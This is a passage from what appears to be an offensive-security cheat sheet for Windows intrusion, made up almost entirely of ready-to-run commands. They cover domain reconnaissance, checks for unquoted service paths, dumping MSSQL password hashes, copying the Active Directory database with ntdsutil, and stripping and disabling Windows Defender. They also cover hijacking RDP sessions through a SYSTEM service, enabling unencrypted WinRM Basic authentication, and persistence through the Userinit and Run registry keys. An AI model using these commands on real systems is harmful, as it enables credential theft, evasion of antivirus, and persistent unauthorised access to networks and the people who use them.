class="ss">&quot;Exchange Trusted Subsystem&quot;</span> <span class="o">/</span><span class="k">domain</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="n">accounts</span> <span class="o">/</span><span class="k">domain</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">user</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">netstat</span> <span class="o">-</span><span class="n">an</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">tasklist</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">sc</span> <span class="n">query</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">systeminfo</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">view</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">view</span> <span class="o">/</span><span class="k">domain</span> <span class="o">&amp;</span> <span class="n">net</span> <span class="k">user</span> <span class="o">%</span><span class="n">USERNAME</span><span class="o">%</span> <span class="o">/</span><span class="k">domain</span> <span class="o">&amp;</span> <span class="n">nltest</span> <span class="o">/</span><span class="n">dclist</span> <span class="o">&amp;</span> <span class="n">gpresult</span> <span class="o">/</span><span class="n">z</span>
</pre></div>
</td></tr></table></p>
<p>Check for unquoted service paths
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wmic</span> <span class="n">service</span> <span class="k">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="o">|</span> <span class="n">findstr</span> <span class="o">/</span><span class="n">i</span> <span class="o">/</span><span class="n">v</span> <span class="ss">&quot;c:\windows\\&quot;</span> <span class="o">|</span> <span class="n">findstr</span> <span class="o">/</span><span class="n">i</span> <span class="o">/</span><span class="n">v</span> <span class="ss">&quot;&quot;</span><span class="err">&quot;</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">gwmi</span> <span class="n">win32_service</span> <span class="o">|</span><span class="k">Select</span> <span class="n">pathname</span> <span class="o">|</span> <span class="k">Where</span> <span class="err">{</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pathname</span> <span class="o">-</span><span class="n">ne</span> <span class="err">$</span><span class="k">null</span><span class="p">)</span><span class="err">}</span> <span class="o">|</span> <span class="k">Where</span> <span class="err">{</span><span class="o">-</span><span class="k">not</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pathname</span><span class="p">.</span><span class="n">StartsWith</span><span class="p">(</span><span class="ss">&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;</span><span class="p">.</span><span class="ss">&quot;) +4)) -match &quot;</span><span class="p">.</span><span class="o">*</span> <span class="p">.</span><span class="o">*</span><span class="err">&quot;}</span>
</pre></div>
</td></tr></table></p>
<p>Change Windows Proxy Settings
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Command</span> <span class="k">to</span> <span class="n">enable</span> <span class="n">proxy</span> <span class="k">usage</span><span class="p">:</span>

    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">ProxyEnable</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">1</span> <span class="o">/</span><span class="n">f</span>

    <span class="n">Command</span> <span class="k">to</span> <span class="n">disable</span> <span class="n">proxy</span> <span class="k">usage</span><span class="p">:</span>

    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">ProxyEnable</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">f</span>

    <span class="n">Command</span> <span class="k">to</span> <span class="n">change</span> <span class="n">the</span> <span class="n">proxy</span> <span class="n">address</span><span class="p">:</span>

    <span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">ProxyServer</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">d</span> <span class="n">proxyserveraddress</span><span class="p">:</span><span class="n">proxyport</span> <span class="o">/</span><span class="n">f</span>

    <span class="n">Also</span><span class="p">,</span> <span class="k">in</span> <span class="n">this</span> <span class="k">case</span><span class="p">,</span> <span class="n">it</span> <span class="k">is</span> <span class="n">a</span> <span class="n">per</span><span class="o">-</span><span class="k">user</span> <span class="n">setting</span> <span class="k">than</span> <span class="n">a</span> <span class="k">system</span><span class="o">-</span><span class="n">wide</span> <span class="n">setting</span><span class="p">.</span>
</pre></div>
</td></tr></table></p>
<p>Mount a .win image remotely on target machine
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Dism</span> <span class="o">/</span><span class="k">get</span><span class="o">-</span><span class="n">wiminfo</span> <span class="o">/</span><span class="n">wimfile</span><span class="p">:</span><span class="n">z</span><span class="p">:</span><span class="err">\</span><span class="n">win7</span><span class="err">\</span><span class="n">Acme_Win7</span><span class="p">.</span><span class="n">wim</span> 


    <span class="n">Boot</span> <span class="n">Dir</span>
    <span class="n">Dism</span> <span class="o">/</span><span class="n">Mount</span><span class="o">-</span><span class="n">Wim</span> <span class="o">/</span><span class="n">WimFile</span><span class="p">:</span><span class="n">z</span><span class="p">:</span><span class="err">\</span><span class="n">win7</span><span class="err">\</span><span class="n">Acme_Win7</span><span class="p">.</span><span class="n">wim</span> <span class="o">/</span><span class="k">index</span><span class="p">:</span><span class="mi">1</span> <span class="o">/</span><span class="n">MountDir</span><span class="p">:</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">offline</span>

    <span class="k">C</span><span class="p">:</span> <span class="n">Drive</span>
    <span class="n">Dism</span> <span class="o">/</span><span class="n">Mount</span><span class="o">-</span><span class="n">Wim</span> <span class="o">/</span><span class="n">WimFile</span><span class="p">:</span><span class="n">z</span><span class="p">:</span><span class="err">\</span><span class="n">win7</span><span class="err">\</span><span class="n">Acme_Win7</span><span class="p">.</span><span class="n">wim</span> <span class="o">/</span><span class="k">index</span><span class="p">:</span><span class="mi">2</span> <span class="o">/</span><span class="n">MountDir</span><span class="p">:</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">offline</span>

    <span class="n">Dism</span> <span class="o">/</span><span class="n">UnMount</span><span class="o">-</span><span class="n">Wim</span> <span class="o">/</span><span class="n">MountDir</span><span class="p">:</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">offline</span> <span class="o">/</span><span class="n">discard</span>
</pre></div>
</td></tr></table></p>
<p>For loop example
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="o">/</span><span class="nv">D</span> <span class="o">%</span><span class="nv">f</span> <span class="nv">in</span> <span class="ss">(</span><span class="s2">&quot;</span><span class="s">C:\Users\username\*</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="k">do</span> <span class="nv">dir</span> <span class="o">%</span><span class="nv">f</span>
</pre></div>
</td></tr></table></p>
<p>For loop, count lines
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="o">/</span><span class="nv">R</span> <span class="s2">&quot;</span><span class="s">C:\users\username\desktop</span><span class="s2">&quot;</span> <span class="o">%</span><span class="nv">f</span> <span class="nv">in</span> <span class="ss">(</span><span class="o">*</span><span class="ss">)</span> <span class="k">do</span> <span class="nv">find</span> <span class="o">/</span><span class="nv">c</span> <span class="o">/</span><span class="nv">v</span> <span class="s2">&quot;&quot;</span> <span class="o">%</span><span class="nv">f</span>
</pre></div>
</td></tr></table></p>
<p>Check if file is locked
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="nv">@echo</span><span class="w"> </span><span class="k">off</span><span class="p">;</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;</span><span class="n">nul</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="k">file</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="k">off</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">locked</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="n">locked</span><span class="p">)</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<p>Lock a file for testing
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="ss">(</span><span class="o">&gt;&amp;</span><span class="mi">2</span> <span class="k">pause</span><span class="ss">)</span> <span class="o">&gt;&gt;</span> <span class="nv">file</span>.<span class="nv">txt</span>
</pre></div>
</td></tr></table></p>
<h4 id="dsquery">DSQUERY<a class="headerlink" href="#dsquery" title="Permanent link">&para;</a></h4>
<p>Get attributes for all Windows hosts in the Domain
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">dsquery</span> <span class="o">*</span> <span class="o">-</span><span class="n">filter</span> <span class="ss">&quot;(&amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))&quot;</span> <span class="o">-</span><span class="k">limit</span> <span class="mi">0</span> <span class="o">|</span><span class="n">dsget</span> <span class="n">computer</span> <span class="o">-</span><span class="n">dn</span> <span class="o">-</span><span class="n">samid</span> <span class="o">-</span><span class="k">desc</span> <span class="o">-</span><span class="n">loc</span> <span class="o">&gt;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">computers</span><span class="p">.</span><span class="n">log</span>
</pre></div>
</td></tr></table></p>
<p>Get attributes for computers in a specific OU
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">dsquery</span> <span class="n">computer</span> <span class="o">&lt;</span><span class="n">OU</span><span class="o">=</span><span class="n">PUT</span> <span class="n">OU</span> <span class="n">HERE</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">limit</span> <span class="mi">0</span> <span class="o">|</span><span class="n">dsget</span> <span class="n">computer</span> <span class="o">-</span><span class="n">dn</span> <span class="o">-</span><span class="n">samid</span> <span class="o">-</span><span class="k">desc</span> <span class="o">-</span><span class="n">l</span> <span class="o">&gt;</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="k">out</span><span class="p">.</span><span class="n">log</span>
</pre></div>
</td></tr></table></p>
<p>Get attributes for users in the specified OU
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="k">user</span> <span class="o">&lt;</span><span class="n">OU</span><span class="o">=</span><span class="n">PUT</span> <span class="n">OU</span> <span class="n">HERE</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">limit</span> <span class="mi">0</span> <span class="o">|</span><span class="n">dsget</span> <span class="k">user</span> <span class="o">-</span><span class="n">dn</span> <span class="o">-</span><span class="n">samid</span> <span class="o">-</span><span class="n">display</span> <span class="o">-</span><span class="k">desc</span> <span class="o">-</span><span class="n">office</span> <span class="o">-</span><span class="n">tel</span> <span class="o">-</span><span class="n">email</span> <span class="o">-</span><span class="n">title</span> <span class="o">-</span><span class="n">hmdir</span> <span class="o">-</span><span class="n">profile</span> <span class="o">-</span><span class="n">loscr</span> <span class="o">-</span><span class="n">mustchpwd</span> <span class="o">-</span><span class="n">canchpwd</span> <span class="o">-</span><span class="n">pwdneverexpires</span> <span class="o">-</span><span class="n">disabled</span>
</pre></div>
</td></tr></table></p>
<p>Get DC
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="n">server</span> <span class="o">-</span><span class="n">forest</span>
</pre></div>
</td></tr></table>
or
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="n">server</span> <span class="o">-</span><span class="n">o</span> <span class="n">rdn</span> <span class="o">-</span><span class="n">forest</span>
</pre></div>
</td></tr></table></p>
<p>Get Domain Functional Level
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="o">*</span> <span class="ss">&quot;DC=corp,DC=test,DC=com&quot;</span> <span class="o">-</span><span class="k">scope</span> <span class="n">base</span> <span class="o">-</span><span class="n">attr</span> <span class="n">msDS</span><span class="o">-</span><span class="n">Behavior</span><span class="o">-</span><span class="k">Version</span> <span class="n">ntMixedDomain</span>
</pre></div>
</td></tr></table></p>
<p>Get Forest Functional Level
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">dsquery</span> <span class="o">*</span> <span class="ss">&quot;CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com&quot;</span> <span class="o">-</span><span class="k">scope</span> <span class="n">base</span> <span class="o">-</span><span class="n">attr</span> <span class="n">msDS</span><span class="o">-</span><span class="n">Behavior</span><span class="o">-</span><span class="k">Version</span> <span class="n">ntMixedDomain</span>
</pre></div>
</td></tr></table></p>
<h4 id="sqlcmd">SQLCMD<a class="headerlink" href="#sqlcmd" title="Permanent link">&para;</a></h4>
<p>List Databases
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">sqlcmd</span> <span class="o">-</span><span class="nv">E</span> <span class="o">-</span><span class="nv">S</span> <span class="nv">localhost</span> <span class="o">-</span><span class="nv">Q</span> <span class="s2">&quot;</span><span class="s">EXEC sp_databases;</span><span class="s2">&quot;</span>
</pre></div>
</td></tr></table></p>
<p>List Tables in Database
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sqlcmd</span> <span class="o">-</span><span class="n">E</span> <span class="o">-</span><span class="n">S</span> <span class="n">localhost</span> <span class="o">-</span><span class="n">Q</span> <span class="ss">&quot;SELECT * FROM DatabaseName.information_schema.tables;&quot;</span> <span class="o">-</span><span class="n">W</span> <span class="o">-</span><span class="n">w</span> <span class="mi">999</span> <span class="o">-</span><span class="n">s</span><span class="ss">&quot;,&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="ss">&quot;c:\windows\temp\RecruiterProd_MSCRM_tables.csv&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Retrieve table contents
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sqlcmd</span> <span class="o">-</span><span class="n">E</span> <span class="o">-</span><span class="n">S</span> <span class="n">localhost</span> <span class="o">-</span><span class="n">d</span> <span class="n">DatabaseName</span> <span class="o">-</span><span class="n">Q</span> <span class="ss">&quot;SELECT * FROM SystemUserBase;&quot;</span> <span class="o">-</span><span class="n">W</span> <span class="o">-</span><span class="n">w</span> <span class="mi">999</span> <span class="o">-</span><span class="n">s</span><span class="ss">&quot;,&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="ss">&quot;c:\windows\temp\RecruiterProd_MSCRM_userbase.csv&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Dump MSSQL Password Hashes
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sqlcmd</span> <span class="o">-</span><span class="n">E</span> <span class="o">-</span><span class="n">S</span> <span class="n">localhost</span> <span class="o">-</span><span class="n">Q</span> <span class="ss">&quot;SELECT name, password_hash FROM master.sys.sql_logins;&quot;</span>
</pre></div>
</td></tr></table></p>
<h4 id="ntdsutil">NTDSUTIL<a class="headerlink" href="#ntdsutil" title="Permanent link">&para;</a></h4>
<p>Built-in utility to create backup copy of the AD database
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">ntdsutil</span> <span class="ss">&quot;ac i ntds&quot;</span> <span class="ss">&quot;ifm&quot;</span> <span class="ss">&quot;create full c:\temp&quot;</span> <span class="n">q</span> <span class="n">q</span>
</pre></div>
</td></tr></table></p>
<h4 id="applocker">Applocker<a class="headerlink" href="#applocker" title="Permanent link">&para;</a></h4>
<p>List Applocker's effective policy on the system
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">ApplockerPolicy</span> <span class="o">-</span><span class="n">Effective</span>
</pre></div>
</td></tr></table></p>
<h4 id="windows-defender">Windows Defender<a class="headerlink" href="#windows-defender" title="Permanent link">&para;</a></h4>
<p>Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">program</span> <span class="n">files</span><span class="err">\</span><span class="n">windows</span> <span class="n">defender</span><span class="err">\</span><span class="n">mpcmdrun</span><span class="p">.</span><span class="n">exe</span><span class="err">&quot;</span> <span class="o">-</span><span class="n">RemoveDefinitions</span> <span class="o">-</span><span class="k">All</span> <span class="k">Set</span><span class="o">-</span><span class="n">MpPreference</span> <span class="o">-</span><span class="n">DisableIOAVProtection</span> <span class="err">$</span><span class="k">true</span>
</pre></div>
</td></tr></table></p>
<h4 id="appcmd">APPCMD<a class="headerlink" href="#appcmd" title="Permanent link">&para;</a></h4>
<p>Get virtual directories in IIS
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">inetsrv</span><span class="err">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">vdir</span> <span class="o">/</span><span class="nb">text</span><span class="p">:</span><span class="n">physicalpath</span>
</pre></div>
</td></tr></table></p>
<h3 id="windows-lateral-movement">Windows Lateral Movement<a class="headerlink" href="#windows-lateral-movement" title="Permanent link">&para;</a></h3>
<p>RDP Hijacking</p>
<p>If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.</p>
<p>Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.</p>
<p><a href="https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6">RDP hijackinghow to hijack RDS and RemoteApp sessions transparently to move through an organisation</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span> <span class="k">View</span> <span class="n">RDP</span> <span class="n">sessions</span> <span class="k">on</span> <span class="k">system</span> <span class="n">your</span> <span class="n">RDP</span><span class="err">&#39;</span><span class="n">d</span> <span class="k">to</span> <span class="k">with</span> <span class="n">administrative</span> <span class="n">permissions</span>
    <span class="o">#</span> <span class="n">Locally</span>
    <span class="n">quser</span>

    <span class="o">#</span> <span class="n">Remote</span>
    <span class="n">quser</span> <span class="o">/</span><span class="n">server</span><span class="p">:</span><span class="o">&lt;</span><span class="n">servername</span><span class="o">&gt;</span>

    <span class="o">#</span> <span class="k">Create</span> <span class="n">a</span> <span class="n">service</span> <span class="n">that</span> <span class="n">will</span> <span class="n">swap</span> <span class="n">your</span> <span class="n">SESSIONNAME</span> <span class="k">with</span> <span class="n">the</span> <span class="n">desired</span> <span class="n">disconnected</span> <span class="k">session</span> 
    <span class="n">sc</span> <span class="k">create</span> <span class="n">sesshijack</span> <span class="n">binpath</span><span class="o">=</span> <span class="ss">&quot;cmd.exe /k tscon 1 /dest:rdp-tcp#XX&quot;</span> <span class="n">error</span><span class="o">=</span> <span class="ss">&quot;ignore&quot;</span>

    <span class="o">#</span> <span class="k">Start</span> <span class="n">service</span>
    <span class="n">net</span> <span class="k">start</span> <span class="n">sesshijack</span>
    <span class="k">or</span>
    <span class="n">sc</span> <span class="k">start</span> <span class="n">sesshijack</span>
</pre></div>
</td></tr></table></p>
<p>Linux to Windows Remoting</p>
<ul>
<li>
<p>In windows run
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">winrm</span> <span class="k">set</span> <span class="n">winrm</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">Service</span><span class="o">/</span><span class="n">Auth</span> <span class="o">@</span><span class="err">{</span><span class="n">Basic</span><span class="o">=</span><span class="ss">&quot;true&quot;</span><span class="err">}</span>
    <span class="n">winrm</span> <span class="k">set</span> <span class="n">winrm</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">Service</span> <span class="o">@</span><span class="err">{</span><span class="n">AllowUnencrypted</span><span class="o">=</span><span class="ss">&quot;true&quot;</span><span class="err">}</span>
</pre></div>
</td></tr></table></p>
</li>
<li>
<p>In linux run
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="err">$</span><span class="n">cred</span> <span class="o">=</span> <span class="k">Get</span><span class="o">-</span><span class="n">Credential</span>
    <span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="s1">&#39;winserver1&#39;</span> <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">cred</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">Basic</span>
</pre></div>
</td></tr></table></p>
</li>
</ul>
<p>PowerShell Remoting over SSH
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">Hostname</span> <span class="o">&lt;</span><span class="n">IP</span> <span class="k">or</span> <span class="n">FQDN</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Username</span> <span class="n">james</span> <span class="o">-</span><span class="n">SSHTransport</span>
</pre></div>
</td></tr></table></p>
<h2 id="windows-persistence-methods">Windows Persistence Methods<a class="headerlink" href="#windows-persistence-methods" title="Permanent link">&para;</a></h2>
<h3 id="registry-keys">Registry Keys<a class="headerlink" href="#registry-keys" title="Permanent link">&para;</a></h3>
<h4 id="modify-registry-keys">Modify registry keys<a class="headerlink" href="#modify-registry-keys" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="k">Add</span> <span class="n">a</span> <span class="k">key</span><span class="o">/</span><span class="n">value</span>
    <span class="n">reg</span> <span class="k">add</span> <span class="err">\\</span><span class="o">&lt;</span><span class="n">systemname</span><span class="o">&gt;</span><span class="err">\</span><span class="o">&lt;</span><span class="k">KEY</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">v</span> <span class="ss">&quot;&lt;value&gt;&quot;&quot; /t &lt;type (Binary,REG_SZ,etc)&gt; /d &lt;data&gt;</span>

<span class="ss">    #Delete a key/value</span>
<span class="ss">    reg delete \\&lt;systemname&gt;\&lt;KEY&gt; /v &quot;</span><span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span><span class="err">&quot;</span>
</pre></div>
</td></tr></table>

<h5 id="userinit-key">Userinit Key<a class="headerlink" href="#userinit-key" title="Permanent link">&para;</a></h5>
<p>This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Winlogon</span><span class="err">\</span><span class="n">Userinit</span>
    <span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Winlogon</span><span class="err">\</span><span class="n">Userinit</span> <span class="o">=</span> <span class="p">(</span><span class="n">REG_SZ</span><span class="p">)</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">userinit</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">badprogram</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
</td></tr></table></p>
<h5 id="run-key">Run Key<a class="headerlink" href="#run-key" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="k">System</span> <span class="n">Wide</span>
    <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span>
    <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">RunOnce</span>

    <span class="o">#</span><span class="k">Current</span> <span class="n">Logged</span><span class="o">-</span><span class="k">On</span> <span class="k">User</span> <span class="k">Only</span>
    <span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span>
    <span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">RunOnce</span>
</pre></div>
